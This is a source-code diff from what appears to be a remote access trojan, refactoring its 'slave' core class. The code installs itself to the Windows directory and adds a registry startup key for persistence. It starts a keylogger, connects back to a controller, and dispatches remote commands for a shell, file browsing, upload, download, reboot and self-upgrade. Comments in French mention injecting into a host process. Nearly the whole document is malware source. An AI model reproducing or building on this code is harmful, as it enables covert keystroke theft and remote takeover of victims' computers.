@@ -1,48 +1,40 @@
 #include <common/Log.hpp>
+
 #include <system/System.hpp>
 #include <system/Registry.hpp>
 #include <system/Process.hpp>
+using namespace System;
+
 #include <blaspheme/Blaspheme.hpp>
 #include <blaspheme/transfer/FileTransfer.hpp>
+using namespace Blaspheme;
+
 #include <malicious/Keylogger.hpp>
 #include <malicious/Screenshot.hpp>
+
 #include "CommandDispatcher.hpp"
 #include "ProgramStart.hpp"
 #include "RemoteControlFunctions.hpp"
-#include "InhibitionCoreImpl.hpp"
-
-using namespace Blaspheme;
-using namespace System;
-using namespace std;
+#include "SlaveCore.hpp"
 
 namespace Inhibition
 {
-
-    InhibitionCoreImpl::InhibitionCoreImpl()
+    SlaveCore::SlaveCore(Blaspheme::ConnectionInfo info) : 
+		exited(false),
+		session(info),
+		installPath(System::getWindowsPath() + "\\" + INHIBITER_EXE_NAME),
+		keylogPath(System::getWindowsPath() + "\\" + KEYLOG),
+		dllPath(System::getWindowsPath() + "\\" + INHIBITION_DLL_NAME),
+		startup(installPath)
 	{
-        initialize();
-    }
+		setConnection(info);
 
-    InhibitionCoreImpl::~InhibitionCoreImpl()
-    {
-        clean();
-    }
-
-    void InhibitionCoreImpl::initialize()
-    {
         // recuperation du chemin d'installation de l'injecteur
-		string winpath;
-        System::getWindowsPath(winpath);
-		installation_path = winpath + "\\" + INHIBITER_EXE_NAME;
-        keylog_path = winpath + "\\" + KEYLOG;
-        dll_path = winpath + "\\" + INHIBITION_DLL_NAME;
-        
-        startup = new ProgramStartupKey(installation_path);
-        Malicious::Keylogger::instance().setKeylog(keylog_path);
+        Malicious::Keylogger::instance().setKeylog(keylogPath);
         Malicious::Keylogger::instance().start();
         
         // tous les modules utilisent le meme canal de commande
-        ServerAbstractFunction::setSession(session);
+        SlaveAbstractFunction::setSlave(*this);
 
         // initialisation des modules
         // on active les modules que le client peut utiliser
@@ -60,38 +52,39 @@ namespace Inhibition
         dispatcher.addServerFunction(GET_WINDOWS_VERSION,   new SendWindowsVersion);
         dispatcher.addServerFunction(REBOOT_CLIENT,         new RebootClient);
         dispatcher.addServerFunction(BROWSE_FILES,          new BrowseFileTree);
-        dispatcher.addServerFunction(REMOTE_SHELL,          new RemoteShell(cinfo));
+        dispatcher.addServerFunction(REMOTE_SHELL,          new RemoteShell);
         dispatcher.addServerFunction(START_DOWNLOAD,        new StartDownload);
         dispatcher.addServerFunction(START_UPLOAD,          new StartUpload);
-        dispatcher.addServerFunction(GET_CLIENT_NAME,       new SendClientName(cinfo));
+        dispatcher.addServerFunction(GET_CLIENT_NAME,       new SendClientName);
     }
 
-    void InhibitionCoreImpl::clean()
+	SlaveCore::~SlaveCore()
+	{
+		exit();
+	}
+
+	Blaspheme::Session& SlaveCore::getSession()
+	{
+		return session;
+	}
+
+    void SlaveCore::exit()
     {
-        delete startup;
-        startup = 0;
+		LOG << "Slave exiting normally";
+        exited = true;
     }
 
-    bool InhibitionCoreImpl::exit()
+	bool SlaveCore::exiting()
+	{
+		return exited;
+	}
+
+    bool SlaveCore::connect()
     {
-        // libération des ressources
-        clean();
-        
-		// exit ne tue pas le processus hote si celui ci a été démarré par COM
-		// et ExitProcess non plus...
-        // cet appel va fermer le le processus injecté et décharger la DLL
-        System::Process::This thisProcess;
-		thisProcess.killHierarchy();
-
-        return true;
+		return session.connect();
     }
 
-    bool InhibitionCoreImpl::connect()
-    {
-		return session.connect(cinfo);
-    }
-
-    bool InhibitionCoreImpl::acquire_stream()
+    bool SlaveCore::acquire_stream()
     {
 		/*
         TcpClient aux;
@@ -112,18 +105,22 @@ namespace Inhibition
         return false;
     }
 
-    void InhibitionCoreImpl::set_connection_infos(const Blaspheme::ConnectionInfo& info)
+	const Blaspheme::ConnectionInfo& SlaveCore::getConnection()const
+	{
+		return session.getConnection();
+	}
+
+    void SlaveCore::setConnection(const Blaspheme::ConnectionInfo& info)
     {
-        cinfo = info;
-		//session.setAuthentication(new StringBasedAuth(cinfo.password));
+		session.setConnection(info);
     }
 
-    const string& InhibitionCoreImpl::getInstallPath()
+    const std::string& SlaveCore::getInstallPath()
     {
-        return installation_path;
+        return installPath;
     }
 
-    void InhibitionCoreImpl::disconnect()
+    void SlaveCore::disconnect()
     {
         LOG << "Disconnecting";
         // on nettoie a la fois la connexion principale et les connexions auxiliaire
@@ -131,10 +128,11 @@ namespace Inhibition
         session.reset();
     }
 
-    bool InhibitionCoreImpl::process_command()
+    bool SlaveCore::process_command()
     {
-		string buffer_cmd;
-        LOG << "Waiting command : ";
+		LOG_THIS_FUNCTION
+		std::string buffer_cmd;
+        LOG << "Waiting command";
         session >> buffer_cmd;
         if(dispatcher.find(buffer_cmd))
         {
@@ -149,17 +147,17 @@ namespace Inhibition
         return true;
     }
 
-    bool InhibitionCoreImpl::uninstall()
+    bool SlaveCore::uninstall()
     {
         LOG << "Removing registry key";
-        startup->uninstall();
+        startup.uninstall();
         LOG << "Launching uninstaller";
         System::Process::Launcher uninstaller(getInstallPath(), UNINSTALL_CMD);		
         exit();
         return true;
     }
 
-    void InhibitionCoreImpl::upgrade()
+    void SlaveCore::upgrade()
     {
         LOG << "Upgrading executable";
         if(!DeleteFile(getInstallPath().c_str()))
